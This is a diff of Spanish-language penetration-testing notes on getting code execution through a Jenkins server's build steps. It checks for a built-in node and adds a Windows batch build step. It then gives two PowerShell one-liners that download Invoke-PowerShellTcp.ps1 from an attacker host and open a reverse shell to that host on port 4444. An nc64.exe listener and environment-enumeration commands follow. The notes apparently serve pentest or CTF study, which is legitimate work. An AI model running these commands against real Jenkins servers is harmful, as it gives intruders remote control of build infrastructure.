@@ -34,16 +34,17 @@ Si no se tiene permisos de 'Admin' pero se puede agregar o editar 'build steps' 
 
 2. Mirar si se esta en un 'Jenkins Master' mirando la parte de 'Buil Executor Status' donde si aparece 'Built-In Node' significa que si lo es 
 
-3. Ir a algún proyecto, luego a 'Configure > Add build step > Execute Windows batch command'. Se puede descargar, ejecutar scripts, correr scripts encodeados y más 
+3. Ir a algún proyecto en verde, luego a 'Configure > Add build step > Execute Windows batch command'. Se puede descargar, ejecutar scripts, correr scripts encodeados y más 
 
 
 4. Descargar, guardar el script para crear una Revershell en Jenkins.
-❯ powershell iex (iwr -UseBasicParsing http://IP/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress IP_Atacante -Port 443    
+❯ powershell iex (iwr -UseBasicParsing http://IP/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress IP_Atacante -Port 4444    
+❯ powershell.exe iex (iwr http://IP/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress IP_Atacante -Port 4444
 
-❯ nc64.exe -lvp 443    # Recibir la ReverShell en la máquina de atacante Windows 
-	❯ $env:username   # Mirar el usuario actual en powershell 
+❯ nc64.exe -nlvp 4444     # Recibir la ReverShell en la máquina de atacante Windows 
+	❯ $env:username       # Mirar el usuario actual en powershell 
 	❯ $env:computername   # Mirar el nombre del computador (server)
-	❯ ls env:         # Mirar los detalles del server 
+	❯ ls env:             # Mirar los detalles del server 
 
 
 Notas:
